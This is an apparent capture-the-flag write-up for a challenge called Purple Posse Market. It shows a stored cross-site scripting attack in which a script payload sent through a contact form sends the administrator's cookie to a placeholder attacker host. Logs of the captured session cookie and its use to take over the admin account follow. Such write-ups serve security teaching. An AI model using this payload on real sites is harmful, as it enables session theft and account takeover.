# Purple Posse Market
[![Description](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/desc.png)](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/desc.png) 

Ok, let's connect to this black market..

[![Home page](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/home.png)](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/home.png) 

The website contains 4 pages where we can view latest arrivals, list of products, website information (about) and contact the Administrator.

The `contact` page caught my attention because we can see that the Administrator is online:

[![Contact page](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/contact.png)](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/contact.png) 

Hmm.. which kind of data can we send to him? First we check if `html` tags are interpreted, give a try with the `img` tag pointing to my webserver:
```
<img src="http://<attacker-host>" />
```

Well, after few seconds, webserver logs said:
```
xxx.xxx.xxx.12 - - [01/Apr/2017:02:28:19 +0200] "GET / HTTP/1.1" 200 483 "http://localhost:3001/admin/messages/86/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

Cool, now try with the `script` tag (thx Azertinv):
```
<script>
new Image().src = "http://<attacker-host>/"+document.cookie;
</script>
```

And..
```
xxx.xxx.xxx.12 - - [01/Apr/2017:02:38:17 +0200] "GET /connect.sid=s%3AI8a4ZhWLggdUBZeFbhH04q4oaW34o0TY.jvRNnsPhTr2%2FnOq4GcUwXYD1wLWlaxLHh%2BvjHM5c3uM HTTP/1.1" 404 501 "http://localhost:3001/admin/messages/94/" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

We set our cookie with the stolen admin cookie and we have full access on the website. Informations required by the government we are working can be found in the administator profile page:

[![Admin profile](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/admin-profile.png)](https://raw.githubusercontent.com/hackbbs/writeups/master/ndh-prequalz-2k17/img/admin-profile.png) 
